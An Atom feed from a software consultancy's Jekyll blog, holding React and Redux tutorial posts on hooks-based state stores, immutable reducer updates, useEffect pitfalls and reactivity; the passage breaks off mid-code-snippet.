<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-05T14:39:26+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">eksia</title><subtitle>eksia offers consulting and custom software development services on the node.js and .NET stacks.
</subtitle><entry><title type="html">Architecting Your Application With Hooks Instead Of Redux</title><link href="http://localhost:4000/hooks-store" rel="alternate" type="text/html" title="Architecting Your Application With Hooks Instead Of Redux" /><published>2021-01-07T23:39:37+02:00</published><updated>2021-01-07T23:39:37+02:00</updated><id>http://localhost:4000/hooks-store</id><content type="html" xml:base="http://localhost:4000/hooks-store">&lt;p&gt;While the rumors about Redux’s demise are most likely mostly exaggerated, there is no doubt that there is no doubt we can achieve a lot of the functionality it provides with hooks. Also, as a rule of thumb, we should avoid using as many external libraries as possible because chances are they could become deprecated in the future. While using the &lt;span class=&quot;code&quot;&gt;useReducer&lt;/span&gt; hook is relatively straightforward, React doesn’t provide a prescription on how to structure a relatively large application. To make matters worse, virtually every blog article on the internet recommends using a different approach.&lt;/p&gt;

&lt;p&gt;Let’s first take a look at the Redux data flow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hook-store/arch.png&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;First of all, it’s worth pointing out that the data flow is unidirectional. The user can trigger actions from the UI, which act on the application state via a &lt;em&gt;reducer&lt;/em&gt;, which in turn triggers rerendering of the UI. The is aim to replicate this flow using the built in React functionality.&lt;/p&gt;

&lt;p&gt;With hooks, React provides powerful features when writing functional components, and it’s not opinionated on how you use them. The problem is, choosing the right approach can be tricky because there are so many permutations. Developers moving from .NET WebAPI or Rails (which are very opinionated in how you name your controllers and routes) to NodeJS / Express (which imposes no restrictions on how to structure your code) will find this approach very familiar.&lt;/p&gt;

&lt;p&gt;Another relatively new addition to React is the Context API. If you’re not familiar with what it is, it’s a way for components to avoid having to pass down props through complex component trees – a technique known as &lt;em&gt;prop drilling&lt;/em&gt;. React’s rendering engine knows to react to changes in the context state, just as it is able to respond to changes in component state or prop changes.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;We could have different contexts per route with separate data stores for each of them.&lt;/li&gt;
  &lt;li&gt;We could use a single context per application, and each route can keep its state in a property of the single app state object.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We’ll go with option number two because that’s what Redux does, and most developers are familiar with that approach. The aim is to create a personal organizer application that has two sections: notes and tasks. The note page and task page structure are similar, so we’ll present the code for notes as an example.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hook-store/pic2.png&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we plan to lay the groundwork for a complex app, we’ll assume that this application has multiple &lt;em&gt;modules&lt;/em&gt;. Each module will have a &lt;em&gt;components&lt;/em&gt; folder, which contains the UI code, and a &lt;em&gt;store&lt;/em&gt; folder which contains the action creators and the reducer logic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hook-store/proj.png&quot; alt=&quot;diagram2&quot; style=&quot;width: 230px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The reducer created with the &lt;span class=&quot;code&quot;&gt;useReducer&lt;/span&gt; hook works similar to a Redux reducer. It’s just a function that takes a &lt;em&gt;state&lt;/em&gt; object and an &lt;em&gt;action&lt;/em&gt; object, and based on that, it returns a new state object. One way of thinking about it is it’s a way of mutating state, but of course we’re not really mutate the existing state, but rather creating a new state object (immutability is one of the central tenets of functional programming).&lt;/p&gt;

&lt;p&gt;We’ll need to create reducer actions for:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Creating a new note.&lt;/li&gt;
  &lt;li&gt;Removing an existing note.&lt;/li&gt;
  &lt;li&gt;Updating an existing note.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
import { NotesState, NotesAction, Note } from './types'
import { ADD_NOTE, REMOVE_NOTE, UPDATE_NOTE } from './actions'
import { v4 } from 'uuid'

export const initialNotesState: NotesState = {
  notes: []
}

export function notesReducer(state: NotesState, action: NotesAction) {
  switch (action.type) {
    case ADD_NOTE: {
      const note = {
        id: v4(),
        title: action.title,
        description: action.description
      }

      return {
        ...state,
        notes: [...state.notes, note]
      }
    }

    case REMOVE_NOTE: {
      return {
        ...state,
        notes: state.notes.filter((note: Note) =&amp;gt; note.id !== action.noteId)
      }
    }

    case UPDATE_NOTE: {
      return {
        ...state,
        notes: state.notes.map((note: Note) =&amp;gt; {
          if (note.id === action.noteId) {
            return {
              ...note,
              title: action.title,
              description: action.description
            }
          } else {
            return note
          }
        })
      }
    }

    default: {
      return state
    }
  }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now that we have defined a reducer, we’ll want to create the equivalent of Redux’s action creators.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
import { Dispatch } from 'react'
import { NotesAction } from './types'
import { AppState } from '../../types'

export const ADD_NOTE = 'ADD_NOTE'
export const REMOVE_NOTE = 'REMOVE_NOTE'
export const UPDATE_NOTE = 'UPDATE_NOTE'

export function addNote(title: string, description: string) {
  return async function (state: AppState, dispatch: Dispatch&amp;lt;NotesAction&amp;gt;) {
    dispatch({
      type: ADD_NOTE,
      title,
      description
    })
  }
}

export function removeNote(noteId: string) {
  return async function (state: AppState, dispatch: Dispatch&amp;lt;NotesAction&amp;gt;) {
    dispatch({
      type: REMOVE_NOTE,
      noteId
    })
  }
}

export function updateNote(noteId: string, title: string, description: string) {
  return async function (state: AppState, dispatch: Dispatch&amp;lt;NotesAction&amp;gt;) {
    dispatch({
      type: UPDATE_NOTE,
      noteId,
      title,
      description
    })
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And finally, let’s have a look the &lt;em&gt;types.ts&lt;/em&gt; file.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
import { ADD_NOTE, REMOVE_NOTE, UPDATE_NOTE } from './actions'

export type Note = {
  id: string
  title: string
  description: string
}

export type NotesState = {
  notes: Note[]
}

export type NotesAction =
  | { type: typeof ADD_NOTE, title: string, description: string }
  | { type: typeof REMOVE_NOTE, noteId: string }
  | { type: typeof UPDATE_NOTE, noteId: string, title: string, description: string }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Our application also has a &lt;em&gt;tasks&lt;/em&gt; section which has the same structure – actions, and a state reducer. Since the application uses a single data store, we need to combine both our reducers into a single one. We’ll create an &lt;em&gt;appReducer.ts&lt;/em&gt; file for this.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
type Action =
  | NotesAction
  | TasksAction

const initialAppState = {
  tasks: initialTasksState,
  notes: initialNotesState
}

function combinedReducer(state: AppState, action: Action) {
  return {
    notes: notesReducer(state.notes, action as NotesAction),
    tasks: tasksReducer(state.tasks, action as TasksAction)
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let’s try to put it all together now.&lt;/p&gt;

&lt;p&gt;We need a way for the UI to be able to call our actions and to react to changes in the application state. We’ll use a global context that can be accessed from anywhere in the application via the useContext hook that will give the calling component access to the following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The global state of the app.&lt;/li&gt;
  &lt;li&gt;An execute method, which will allow it to trigger actions.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
import React, { useReducer, Dispatch } from 'react'
import { AppState, ChildrenProps } from './modules/types'
import appReducer, { initialAppState, Action } from './appReducer'

export type ExecuteFunc = (state: AppState, dispatch: Dispatch&amp;lt;any&amp;gt;) 
  =&amp;gt; Promise&amp;lt;void&amp;lt; | void

export type AppContextType = {
  state: AppState
  execute: (action: ExecuteFunc) =&amp;gt; Promise&amp;lt;void&amp;gt;
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const AppContext = React.createContext({} as any as AppContextType)

export default function AppContextProvider(props: ChildrenProps) {
  const [state, dispatch] = useReducer(combinedReducer, initialAppState)

  async function execute(action: (state: AppState, dispatch: Dispatch&amp;lt;Action&amp;gt;) 
    =&amp;gt; Promise&amp;lt;void&amp;gt; | void) {
    try {
      await action(state, dispatch)
    } catch (error) {
      // take appropriate action and report the error
      alert('The application encountered an error.')
    }
  }

  return (
    &amp;lt;AppContext.Provider value=&amp;gt;
      {props.children}
    &amp;lt;/AppContext.Provider&amp;gt;
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We’ll need to add the &lt;span class=&quot;code&quot;&gt;AppContextProvider&lt;/span&gt; as the root component of the application. Then in a component, we can access the application state and the &lt;span class=&quot;code&quot;&gt;execute&lt;/span&gt; method using the &lt;span class=&quot;code&quot;&gt;useContext&lt;/span&gt; hook.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
const { state, execute } = useContext(AppContext)

function removeNoteClick(noteId: string) {
  execute(noteActions.removeNote(noteId))
}

const notes = state.notes.notes

// rendering the notes
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The source code can be found &lt;a href=&quot;https://github.com/toaderflorin/hooks-store&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">While the rumors about Redux’s demise are most likely mostly exaggerated, there is no doubt that there is no doubt we can achieve a lot of the functionality it provides with hooks. Also, as a rule of thumb, we should avoid using as many external libraries as possible because chances are they could become deprecated in the future. While using the useReducer hook is relatively straightforward, React doesn’t provide a prescription on how to structure a relatively large application. To make matters worse, virtually every blog article on the internet recommends using a different approach.</summary></entry><entry><title type="html">Redux State Update Recipes</title><link href="http://localhost:4000/redux-state-updates" rel="alternate" type="text/html" title="Redux State Update Recipes" /><published>2021-01-01T08:39:37+02:00</published><updated>2021-01-01T08:39:37+02:00</updated><id>http://localhost:4000/redux-state-updates</id><content type="html" xml:base="http://localhost:4000/redux-state-updates">&lt;p&gt;&lt;img src=&quot;/images/immutable-patterns/redux.png&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One aspect that can be challenging for React / Redux newcomers is how to handle state updates since React mandates application state be immutable. Functional code generally doesn’t mutate existing objects - it creates new instances of objects with properties changed. In this article, we’ll look at ways of using some of Javascript’s functional features like &lt;span class=&quot;code&quot;&gt;map&lt;/span&gt;, &lt;span class=&quot;code&quot;&gt;reduce&lt;/span&gt;, &lt;span class=&quot;code&quot;&gt;filter&lt;/span&gt;, and the spread operator to achieve the desired state changes without actually mutating the existing state object.&lt;/p&gt;

&lt;p&gt;React and Redux have been conceived from the ground up to follow the functional philosophy of development. While laying out all the benefits of functional programming is beyond this article’s scope, check out this &lt;a href=&quot;/immutability&quot;&gt;primer&lt;/a&gt; on how reactivity and immutability work in conjunction with React.&lt;/p&gt;

&lt;p&gt;Let’s consider a complex object tree, in the form of an object that has complex objects as properties.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
const obj = {
  innerObj: {
    someProp: 12,
    someOtherProp: 'A string.'
  },
  anotherInnerObj: {
    yetAnotherProp: 'Another string.'
  }
}

function changeSomeProp(obj, val) {
  // obj.innerObj.someProp = val
  // this would be a no no, in functional programing

  return {
    ...obj,
    innerObj: {
      ...obj.innerObj,
      someProp: val
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The spread operator creates a new instance and copies the source object’s properties to the destination object, but it’s worth mentioning this doesn’t create a deep clone, only a shallow one.&lt;/p&gt;

&lt;p&gt;We can repesent object trees using diagrams like the one below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/immutable-patterns/tree.svg&quot; alt=&quot;diagram3&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far, everything is straight forward. Where things get more interesting is when we’re starting to deal with arrays or collections of objects (because we are now deciding which part of the state to change programmatically).&lt;/p&gt;

&lt;p&gt;Let us consider the case of a React application that uses Redux and wants to manage a list of products. We will need actions for adding, removing and updating a product in the collection.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
switch (action.type) {
  case ADD_PRODUCT: {
    ...
  }

  case UPDATE_PRODUCT: {
    ...
  }
  
  case REMOVE_PRODUCT: {
    ...
  }

  default: {
    return state
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let us now look at the individual cases.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
case ADD_PRODUCT: {
  const product = {
    id: v4(),
    description: action.description,
    price: action.price,
    category: action.category
  }

  return {
    ...state,
    products: [...state.products, products]
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And here’s a code snippet on how to update the properties of a specific product by id. The &lt;span class=&quot;code&quot;&gt;map&lt;/span&gt; function creates a new array that keeps the existing items intact if they don’t match the desired id but creates a new product with the updated properties when the id matches.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
case UPDATE_PRODUCT: {
  return {
    ...state,
    product: state.product.map(product =&amp;gt; {
      if (product.id === action.productId) {
        return {
          ...product,
          description: action.description,
          category: action.category,
          price: action.price            
        }
      } else {
        return product
      }
    })
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let’s now add an action that will remove the product from the list by id.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
case REMOVE_PRODUCT: {
  return {
    ...state,
    products: state.products.filter(product =&amp;gt; product.id !== action.productId)
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;What if, instead of using an array, we use a key-value map (in the form of a plain object) and access the products by id? This is a common pattern because it allows easy access to an item without having to iterate through the whole collection.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
case ADD_PRODUCT: {
  const product = {
    id: v4(),
    description: action.description,
    price: action.price,
    category: action.category
  }

  return {
    ...state,
    products: {
      ...state.products,
      [product.id]: product
    }
  }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Updating will now look like this:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
  case UPDATE_PRODUCT: {    
    return {
      ...state,
      products: {
        ...state.products,
        [product.id]: {
          ...state.products[product.id],
          description: action.description,
          category: action.category,
          price: action.price
        }
      }
    }    
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And finally for removing the item, we’ll use the &lt;span class=&quot;code&quot;&gt;reduce&lt;/span&gt; function and an accumulator.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
case REMOVE_PRODUCT: {    
  const remainingProducts = state.products.reduce(
    (acc, product) =&amp;gt; {
      if (product.id !== action.productId) {
        acc[product.id] = product
      }
    }, {})
  )

  return {
    ...state,
    products: remainingProducts      
  }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Developers used to an imperative way of doing things might find this way of doing things might find the functional approach unintuitive. Luckily, for the most part, these code snippets can be copy-pasted directly into your reducers with little structural change.&lt;/p&gt;</content><author><name></name></author><summary type="html"></summary></entry><entry><title type="html">React Hooks Considerations</title><link href="http://localhost:4000/hooks" rel="alternate" type="text/html" title="React Hooks Considerations" /><published>2020-11-18T08:39:37+02:00</published><updated>2020-11-18T08:39:37+02:00</updated><id>http://localhost:4000/hooks</id><content type="html" xml:base="http://localhost:4000/hooks">&lt;p&gt;React’s development history is widely documented and was developed for internal use at Facebook, as it is the case with a lot of libraries, and for quite some time it was ES5 only – ES6 support of course followed, but the team quite quickly realized that if a component doesn’t need to maintain an internal state, there’s no need for it to be a class, and one of the major additions of v14.0 were stateless functional components. Not long after, the &lt;a href=&quot;https://medium.com/@dan_abramov/smart-and-dumb-components-7ca2f9a7c7d0&quot;&gt;container / presentational pattern&lt;/a&gt; appeared, where the state changes would be handled in a wrapping class component, and the inner child component would handle the presentation part.&lt;/p&gt;

&lt;p&gt;The functional syntax became popular with quite a few developers – after all, languages like Elm are quite popular these days.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/hooks/hooks.jpg&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The question then becomes: how does one keep the functional syntax and, at the same time, allows for the use of state in a component? The answer is, of course, hooks. Also, changing the syntax doesn’t mean the component state or lifecycle are going away.&lt;/p&gt;

&lt;p&gt;There’s a &lt;span class=&quot;code&quot;&gt;useState&lt;/span&gt; hook, for example. There’s also a &lt;span class=&quot;code&quot;&gt;useEffect&lt;/span&gt;, and we’ll look at both in a moment. Let’s consider a simple application that fetches some data from an API and then does something with it.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function App(props) {
  const [state, setState] = useState({
    tasks: [],
    isTasksLoading: false
  })

  async function fetchTasks() {
    const tasks = await api.getTasks()
    fetchTasks(tasks)
  }
  
  useEffect(() =&amp;gt; {
    fetchTasks()
  }, 
  // the empty dependency array indicates the effect runs on component mount 
  // and only once
  [])

  return (
    &amp;#x3C;div&amp;#x3E;
      ... code to render
    &amp;#x3C;/div&amp;#x3E;
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The first thing that’s very apparent with hooks is we no longer have lifecycle methods like  &lt;span class=&quot;code&quot;&gt;componentDidMount&lt;/span&gt; or  &lt;span class=&quot;code&quot;&gt;componentWillReceiveProps&lt;/span&gt;, so we need to rely on a different mechanism – the  &lt;span class=&quot;code&quot;&gt;useEffect&lt;/span&gt; hook fills that role now. If we want to react to the component being mounted, we can pass in an empty dependency array. If we want to emulate the &lt;span class=&quot;code&quot;&gt;componentWillReceiveProps&lt;/span&gt; we can pass in the props as dependencies.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function App(props) {
  const { currentUser } = props

  const [state, setState] = useState({
    tasks: [],
    isTasksLoading: false
  })  

  async function fetchTasks(currentUser) {
    const tasks = await api.getTasks(currentUser)
    fetchTasks(tasks)
  }
  
  useEffect(() =&amp;gt; {
    fetchTasks(currentUser)
  }, 
  [currentUser])

  return (
    &amp;#x3C;div&amp;#x3E;
      ... code to render
    &amp;#x3C;/div&amp;#x3E;
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It’s worth pointing out that the way &lt;span class=&quot;code&quot;&gt;useState&lt;/span&gt; works with hooks is different that the way &lt;span class=&quot;code&quot;&gt;useState&lt;/span&gt; works with class components.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;With class components, it merges the new state into the old state, via the JS spread syntax.&lt;/li&gt;
  &lt;li&gt;With functional components, it simply replaces the state object.&lt;/li&gt;
  &lt;li&gt;You can use &lt;span class=&quot;code&quot;&gt;useState&lt;/span&gt; multiple times in functional components and have different instances of state.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;And extremely important, with functional components there is no &lt;span class=&quot;code&quot;&gt;this.state&lt;/span&gt;. Also, functional components are &lt;em&gt;closures&lt;/em&gt;, which means they have their own lexical context, and so they capture the values of variables declared in the function when those functions were called. So in our case, when the response comes back from the server, the value of &lt;span class=&quot;code&quot;&gt;state&lt;/span&gt; is the same as it was when the component was called. Typically, this wouldn’t be a problem, especially because you can use the &lt;span class=&quot;code&quot;&gt;useState&lt;/span&gt; hook multiple times, and you can have different disjointed pieces of state.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;The main problem with this approach arises if you are trying to use one single view model object as state and merge new state prop values into it if you have to deal with concurrency.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The typical case in which this would happen is if you aren’t using a store manager like Redux, and use a &lt;a href=&quot;https://reactjs.org/docs/lifting-state-up.html&quot;&gt;lift state up&lt;/a&gt; approach. Typically, this would mean that you are usinng the root component, or the root component route as a state manager and you are using prop drilling and callbacks.&lt;/p&gt;

&lt;p&gt;So let’s illustrate the point. Let’s say that aside from tasks, we also want the user to be able to scribble down and manage notes, and we need to change the data we’re displaying when the currently logged in user changes.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function App(props) {
  const { currentUser } = props

  const [state, setState] = useState({
    tasks: [],
    notes: [],
    tasksLoading: false,
    notesLoading: false
  })

  const { tasks, tasksLoading, notes, notesLoading } = state

  async function fetchTasks(currentUser) {
    const tasks = await api.getTasks(currentUser)    
    setState({
      ...state,
      tasks,
      tasksLoading: false
    })
  }

  async function fetchNotes(currentUser) {
    setState({
      ...state,
      notesLoading: true
    })

    const notes = await api.getNotes(currentUser)

    setState({
      ...state,
      notes,
      notesLoading: true
    })  
  }
  
  useEffect(() =&amp;gt; {
    fetchTasks(currentUser)
  }, 
  [currentUser])

  return (
    &amp;#x3C;div&amp;#x3E;
      &amp;#x3C;Tasks tasks={tasks} tasksLoading={tasksLoading} /&amp;#x3E;
      &amp;#x3C;Notes notes={notes} notesLoading={notesLoading} /&amp;#x3E;
    &amp;#x3C;/div&amp;#x3E;
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;While not necessarily easy to spot, we now have a racing condition.&lt;/p&gt;

&lt;p&gt;We can change it like this.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function App(props) {
  const { currentUser } = props

  const [tasks, setTasks] = useState({
    tasks: [],
    tasksLoading: false
  })

  const [notes, setNotes] = useState({
    notes: [],
    notesLoading: false
  })

  async function fetchTasks(currentUser) {
    const tasks = await api.getTasks(currentUser)    
    setTasks({      
      tasks,
      tasksLoading: false
    })
  }

  async function fetchNotes(currentUser) {
    setState({
      notes: [],
      notesLoading: true
    })

    const notes = await api.getNotes(currentUser)

    setState({
      ...state,
      notes,
      notesLoading: true
    })  
  }
  
  useEffect(() =&amp;gt; {
    fetchTasks(currentUser)
    fetchNotes(currentUser)
  }, 
  [currentUser])

  return (
    &amp;#x3C;div&amp;#x3E;
      &amp;#x3C;Tasks tasks={tasks} tasksLoading={tasksLoading} /&amp;#x3E;
      &amp;#x3C;Notes notes={notes} notesLoading={notesLoading} /&amp;#x3E;
    &amp;#x3C;/div&amp;#x3E;
  )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Since we are no longer merging the old state into the big state object, we no longer have the racing condition. This is a perfectly valid approach for fixing the problem, but unfortunately, it means we have lost the hierarchical nature of the state object (so we can no longer use it as a view model) – remember that when we are lifting the state to the parent component, we would like the structure of the object to reflect the child component hierarchy.&lt;/p&gt;

&lt;p&gt;A fundamental difference between the old approach and the new one is the addition of the &lt;span class=&quot;code&quot;&gt;useEffect&lt;/span&gt; hook, which is called after the functional component has rendered, making it behave like the &lt;span class=&quot;code&quot;&gt;componentWillReceiveProps&lt;/span&gt; function. This approach is interesting because using this method to make API calls (and therefore changing the state) leads to rerendering. Reacting to state changes in the application is generally considered bad practice because it can also lead to complicated dependency chains, making the code hard to follow. Infinite loops are also a common problem in code written by newcomers.&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
useEffect(() =&amp;gt; {
  fetchTasks(currentUser)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Calling the &lt;span class=&quot;code&quot;&gt;fetchTask&lt;/span&gt; method like this causes an infinite loop because it sets the &lt;span class=&quot;code&quot;&gt;isLoading&lt;/span&gt; field to &lt;span class=&quot;code&quot;&gt;true&lt;/span&gt;, which triggers rerendering, which calls the effect again. In some cases, the dependency cycles might be more complicated: a parent component might trigger an effect in a child component, making the problem harder to diagnose. To make matters slightly worse is the fact that React’s strict mode triggers double rendering for debugging purposes (React tries to ensure your state changes are &lt;a href=&quot;https://stackoverflow.com/questions/1077412/what-is-an-idempotent-operation#:~:text=at%204%3A12-,12,as%20making%20a%20single%20request.&quot;&gt;idempotent&lt;/a&gt;, and don’t lead to infinite refreshing loops), which can make things extra confusing.&lt;/p&gt;

&lt;p&gt;To wrap up, while hooks are a welcome addition to React, the learning curve can be quite steep.&lt;/p&gt;</content><author><name></name></author><summary type="html">React’s development history is widely documented and was developed for internal use at Facebook, as it is the case with a lot of libraries, and for quite some time it was ES5 only – ES6 support of course followed, but the team quite quickly realized that if a component doesn’t need to maintain an internal state, there’s no need for it to be a class, and one of the major additions of v14.0 were stateless functional components. Not long after, the container / presentational pattern appeared, where the state changes would be handled in a wrapping class component, and the inner child component would handle the presentation part.</summary></entry><entry><title type="html">Reactivity And Immutability In React</title><link href="http://localhost:4000/immutability" rel="alternate" type="text/html" title="Reactivity And Immutability In React" /><published>2020-04-02T09:39:37+03:00</published><updated>2020-04-02T09:39:37+03:00</updated><id>http://localhost:4000/immutability</id><content type="html" xml:base="http://localhost:4000/immutability">&lt;p&gt;Before getting into library-specific details, it’s worth starting with a definition of what constitutes reactivity. A typical example would be an Excel spreadsheet: if a cell aggregates data from other cells, that cell instantly changes if we change a value in any of the aggregated cells. In reactive programming, if a variable A depends on B and C, a change in either B or C would also trigger a change in A. While there seems to be an ongoing debate whether React is truly reactive, there’s no doubt that the UI reacts to changes in the data model, even if parts of the model itself don’t react to other parts being changed, so from now on, we’ll consider this definition of reactivity.&lt;/p&gt;

&lt;p&gt;Since in most programming languages mutating an existing instance doesn’t notify other objects or the runtime of the change, a typical pattern is to use events or callbacks for this. As an example, Windows Presentation Foundation uses models that implement an interface called
&lt;span class=&quot;code&quot;&gt;INotifyPropertyChanged&lt;/span&gt; for data-binding and wraps class fields in getters and setters, and it’s the setter’s responsibility to fire change events. .NET provides a convenient base class object that implements the interface, so a typical observable view model would look like this:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
public class ObservableViewModel: ObservableObject 
{
  get Field1 
  {
    _field1 = value;
    NotifyPropertChanged('field1');
  }
  set
  {
    return _field1;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The WPF rendering system receives these events and then uses .NET’s reflection system to read the properties that are named like that. So if you are passing a different string in the notify event, it won’t work.&lt;/p&gt;

&lt;p&gt;VueJS does something similar, but it’s a little bit less transparent; it looks at the model the component was initialized with and then wraps the existing fields in getters and setters that also notify it. These wrappers aren’t directly visible to the user, which is why it is crucial to understand what the library does under the hood — adding a property to the model that wasn’t present when the component was initialized means that property isn’t observable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/reactivity/vue-reactivity.png&quot; alt=&quot;diagram2&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mutations play a central role when it comes to observability in these libraries, but React works a little bit differently because it is much more functional in nature. Rendering here is done by calling the setState method on a component, or the component receives new props from a parent. Of course, changing the whole thing is simple because react does a diff. But by using a little functional trick called &lt;em&gt;immutability&lt;/em&gt; in our code, we avoid even this diffing process.&lt;/p&gt;

&lt;p&gt;Let us use the customary task manager example and look at the following code:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
const taskA = {
  id: '4b390f82-8b6f-4176-b28e-455ce9c24150',
  text: 'Send email to John.',
  completed: false
}

const taskB = {
  id: '32557639-ca7a-4188-868a-2b5938d2bd01'
  text: 'Play foosball.',
  completed: false
}

const taskC = taskA

console.log('This should be false.', taskA === taskB)
console.log('This should be true.', taskA === taskC)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This of course is nothing new because JavaScript doesn’t check the values of the fields, it checks the instances and in the case of person A and B we have two different instances of an object with fields of equal value.&lt;/p&gt;

&lt;p&gt;Let’s say we now have a method that is called &lt;code&gt;removeLastName()&lt;/code&gt;. In the case of mutable languages we could write something like this:&lt;/p&gt;

&lt;div class=&quot;margin-bottom&quot;&gt;
&lt;pre&gt;&lt;code class=&quot;language-js line-numbers&quot;&gt;
function completeTask(task) {
  task.completed = true
}
